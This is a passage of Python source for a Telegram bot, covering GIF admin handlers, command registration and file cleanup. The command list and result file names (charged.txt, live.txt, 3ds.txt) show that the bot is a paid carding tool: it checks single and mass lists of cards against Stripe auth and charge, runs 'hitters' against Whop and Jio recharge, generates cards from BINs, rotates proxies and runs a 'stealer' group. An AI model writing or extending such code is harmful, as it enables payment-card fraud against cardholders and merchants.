    await event.reply(pe(
        f"[⌯] 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅\n{SEP}\n"
        f"[⌯] 𝗜𝗻𝗱𝗲𝘅 ⌁ {idx_remove+1}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(gifs)} 🎬"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/cleargifs$'))
async def cleargifs_cmd(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.reply(pe("🚫 Admin only!"), parse_mode='html'); return
    try:
        from storage import GIFS_FILE  # type: ignore
        with open(GIFS_FILE, 'w') as f:
            f.write("")
    except Exception as e:
        await event.reply(pe(f"❌ Failed: {e}"), parse_mode='html'); return
    await event.reply(pe(f"[⌯] 𝗔𝗹𝗹 𝗚𝗶𝗳𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 ✅\n{SEP}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ 0 🎬"), parse_mode='html')


@bot.on(events.NewMessage())
async def addgif_receiver(event):
    """Catch gif/file/link when admin is in addgif pending mode."""
    try:
        uid = event.sender_id
        if uid not in _pending_gif:
            return
        msg = event.message
        if not msg:
            return

        # Ignore commands — safely read text/caption
        txt_raw = (getattr(msg, 'text', None) or getattr(msg, 'caption', None) or "").strip()
        if txt_raw.startswith('/'):
            return

        collected_url = None

        # ── Case 1: Telegram GIF / video / document (animation) ──
        _has_media = (
            getattr(msg, 'media', None) is not None
            or getattr(msg, 'video', None) is not None
            or getattr(msg, 'document', None) is not None
            or getattr(msg, 'audio', None) is not None
            or getattr(msg, 'sticker', None) is not None
        )
        if _has_media:
            try:
                ext = ".mp4"
                _doc = getattr(msg, 'document', None)
                if _doc is not None:
                    _mime = getattr(_doc, 'mime_type', '') or ''
                    if 'gif' in _mime.lower():
                        ext = ".gif"
                    elif 'webm' in _mime.lower():
                        ext = ".webm"
                elif getattr(msg, 'video', None) is not None:
                    ext = ".mp4"
                elif getattr(msg, 'sticker', None) is not None:
                    ext = ".webp"

                _dest = f"gifs/{secrets.token_hex(8)}_{int(time.time())}{ext}"
                os.makedirs("gifs", exist_ok=True)
                fp = await msg.download_media(file=_dest)
                if fp:
                    collected_url = fp
                else:
                    await event.reply(pe("❌ Download returned empty"), parse_mode='html')
                    return
            except Exception as e:
                await event.reply(pe(f"❌ Download failed: {str(e)[:150]}"), parse_mode='html')
                return

        # ── Case 2: Direct link (URL) ──
        elif txt_raw and (txt_raw.startswith('http://') or txt_raw.startswith('https://')):
            # basic validation
            if any(txt_raw.lower().endswith(ext) for ext in
                   ('.gif', '.mp4', '.webm', '.mov', '.mkv')) or 'giphy.com' in txt_raw or 'tenor.com' in txt_raw:
                collected_url = txt_raw
            else:
                # still accept — admin knows what they're doing
                collected_url = txt_raw

        # ── Case 3: File reference (Telegram file_id) ──
        elif txt_raw and re.match(r'^[A-Za-z0-9_\-]{40,}$', txt_raw):
            collected_url = txt_raw

        if not collected_url:
            await event.reply(pe(
                f"❌ 𝗨𝗻𝘀𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱\n{SEP}\n"
                f"[⌯] 𝗦𝗲𝗻𝗱 𝗚𝗜𝗙, 𝗳𝗶𝗹𝗲, 𝗼𝗿 𝗱𝗶𝗿𝗲𝗰𝘁 𝗹𝗶𝗻𝗸\n"
                f"[⌯] /cancel 𝘁𝗼 𝗮𝗯𝗼𝗿𝘁"
            ), parse_mode='html')
            return

        # Save via existing helper
        try:
            add_gif(collected_url)
        except Exception as e:
            await event.reply(pe(f"❌ Save failed: {str(e)[:100]}"), parse_mode='html')
            return

        _pending_gif.pop(uid, None)
        total = len(load_gifs())
        await event.reply(pe(
            f"[⌯] 𝗚𝗶𝗳 𝗔𝗱𝗱𝗲𝗱 ✅\n{SEP}\n"
            f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total} 🎬\n{SEP}\n"
            f"[⌯] 𝗔𝗱𝗱 𝗺𝗼𝗿𝗲 ⌁ /addgif\n"
            f"[⌯] 𝗟𝗶𝘀𝘁 ⌁ /listgifs"
        ), parse_mode='html')
    except Exception as e:
        print(f"[addgif_receiver] {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ REGISTER COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
def _register_commands():
    user_cmds = [
        {"command": "start", "description": "🚀 Open dashboard"},
        {"command": "sh", "description": "⚡ Single check"},
        {"command": "msh", "description": "🔥 Mass check"},
        {"command": "st", "description": "💳 Stripe Auth (single)"},
        {"command": "mst", "description": "🔥 Stripe Auth (mass)"},
        {"command": "st1", "description": "💎 Stripe Charge (single)"},
        {"command": "mst1", "description": "🔥 Stripe Charge (mass)"},
        {"command": "whop", "description": "🎯 Whop hitter (single)"},
        {"command": "jio", "description": "📱 Jio recharge hitter"},
        {"command": "plans", "description": "⭐ View plans"},
        {"command": "myplan", "description": "💎 Check your plan"},
        {"command": "redeem", "description": "🔑 Redeem key"},
        {"command": "setproxy", "description": "🔌 Set proxy"},
        {"command": "clearuserproxy", "description": "🗑️ Clear proxy"},
        {"command": "chkproxy", "description": "✅ Test proxy"},
        {"command": "mysites", "description": "🌐 My sites"},
        {"command": "setmysites", "description": "🌐 Set sites"},
        {"command": "clearmysites", "description": "🌐 Clear sites"},
        {"command": "genbin", "description": "🎴 Generate cards"},
        {"command": "bin", "description": "🔍 BIN lookup"},
        {"command": "split", "description": "📂 Split file"},
        {"command": "fb", "description": "📝 Send feedback"},
    ]
    admin_cmds = user_cmds + [
        {"command": "admin", "description": "👑 Admin panel"},
        {"command": "addadmin", "description": "➕ Add admin"},
        {"command": "rmadmin", "description": "❌ Remove admin"},
        {"command": "setstealer", "description": "🕵️ Set stealer GC"},
        {"command": "stealerinfo", "description": "🕵️ Stealer GC info"},
        {"command": "pool", "description": "🎛️ Pool ON/OFF"},
        {"command": "rmsteal", "description": "🚫 Block user from stealer"},
        {"command": "unsteal", "description": "✅ Unblock user"},
        {"command": "steallist", "description": "📋 List blocked"},
        {"command": "grant", "description": "✅ Grant access"},
        {"command": "auth", "description": "🔐 Auth access"},
        {"command": "revoke", "description": "❌ Revoke access"},
        {"command": "addpremium", "description": "➕ Add premium"},
        {"command": "rmpremium", "description": "➖ Remove premium"},
        {"command": "ban", "description": "🚫 Ban user"},
        {"command": "unban", "description": "✅ Unban user"},
        {"command": "users", "description": "📋 List users"},
        {"command": "stats", "description": "📈 Bot stats"},
        {"command": "genkey", "description": "🔑 Generate keys"},
        {"command": "keys", "description": "🔑 View keys"},
        {"command": "clearallkeys", "description": "🗑️ Clear keys"},
        {"command": "addsite", "description": "🌐 Add site"},
        {"command": "rmsite", "description": "❌ Remove site"},
        {"command": "sites", "description": "📋 List sites"},
        {"command": "checksites", "description": "🔍 Check sites"},
        {"command": "addproxy", "description": "📡 Add proxy"},
        {"command": "rmproxy", "description": "❌ Remove proxy"},
        {"command": "proxies", "description": "📋 List proxies"},
        {"command": "checkproxies", "description": "🔍 Check proxies"},
        {"command": "clearproxy", "description": "🧹 Clear pool"},
        {"command": "getproxy", "description": "📥 Get pool file"},
        {"command": "setlog", "description": "📢 Set log group"},
        {"command": "checklog", "description": "📢 Check log group"},
        {"command": "filtersite", "description": "🔍 Filter sites by max price"},
        {"command": "setlimit", "description": "⚙️ Set limit"},
        {"command": "broadcast", "description": "📢 Broadcast"},
        {"command": "restart", "description": "🔄 Restart bot"},
        {"command": "maint", "description": "🛠️ Maintenance mode (owner)"},
        {"command": "maintcmd", "description": "🛠️ Per-command maintenance (owner)"},
        {"command": "ascrap", "description": "📦 Scrape all users' hits (admin)"},
        {"command": "addgif", "description": "🎬 Add GIF (admin)"},
        {"command": "listgifs", "description": "🎬 List GIFs (admin)"},
        {"command": "rmgif", "description": "🗑️ Remove GIF (admin)"},
        {"command": "cleargifs", "description": "🗑️ Clear all GIFs (admin)"},
    ]
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    try:
        _http_session.post(f"{base}/setMyCommands", json={"commands": user_cmds}, timeout=5)
        _http_session.post(f"{base}/setMyCommands",
                           json={"commands": admin_cmds, "scope": {"type": "chat", "chat_id": OWNER_ID}},
                           timeout=5)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STARTUP CLEANUP
# ══════════════════════════════════════════════════════════════════════════════
def _startup_cleanup():
    import glob as _g
    cleaned = 0
    tmp_upload_dir = os.path.join(__import__('tempfile').gettempdir(), "rxo_uploads")
    if os.path.isdir(tmp_upload_dir):
        now = time.time()
        for fpath in _g.glob(os.path.join(tmp_upload_dir, "*")):
            try:
                if now - os.path.getmtime(fpath) > 3600:
                    os.remove(fpath); cleaned += 1
            except Exception: pass
    KEEP_FILES = {'sites.txt', 'proxy.txt', 'premium.txt', 'banned.txt',
                  'gifs.txt', 'welcome.txt', 'log_group.txt', 'keys.txt',
                  'videos.txt', 'stealer_gc.txt', 'redis_pass.txt'}
    for fpath in _g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), "*.txt")):
        fname = os.path.basename(fpath)
        if fname in KEEP_FILES: continue
        try:
            if os.path.getsize(fpath) > 0:
                os.remove(fpath); cleaned += 1
        except Exception: pass
    for pattern in ("gen_*.txt", "split_*.txt", "charged.txt", "live.txt",
                    "approved.txt", "3ds.txt", "declined.txt", "error.txt",
                    "proxies_*.txt", "*.session-journal", "*.session-wal",
                    "*.session-shm"):
        for fpath in _g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), pattern)):
            try: os.remove(fpath); cleaned += 1
            except Exception: pass
    for pat in ["bot.py.bak.*", "bot.py.safe.*", "config.py.bak.*", "storage.py.bak.*",
                "check_engine.py.bak.*", "non_api.py.bak.*", "emojis.py.bak.*"]:
        files = sorted(_g.glob(os.path.join(os.path.dirname(os.path.abspath(__file__)), pat)),
                       key=os.path.getmtime, reverse=True)
        for old_file in files[3:]:
            try: os.remove(old_file); cleaned += 1
            except Exception: pass
    print(f"[STARTUP-CLEANUP] Removed {cleaned} stale files")


try: _startup_cleanup()
except Exception as _e: print(f"[STARTUP-CLEANUP] error: {_e}")


async def _background_cleanup():
    while True:
        await asyncio.sleep(3600)
        try: _startup_cleanup()
        except Exception as e: print(f"[BG-CLEANUP] error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ BOOT
# ══════════════════════════════════════════════════════════════════════════════
async def _boot():
    asyncio.create_task(_background_cleanup())


if __name__ == "__main__":
    _register_commands()
    _bin_count = load_bins()
    print(f"✅ {BOT_NAME} started successfully! (BIN DB: {_bin_count:,} entries)")
    loop = asyncio.get_event_loop()
    loop.create_task(_boot())
    bot.run_until_disconnected()
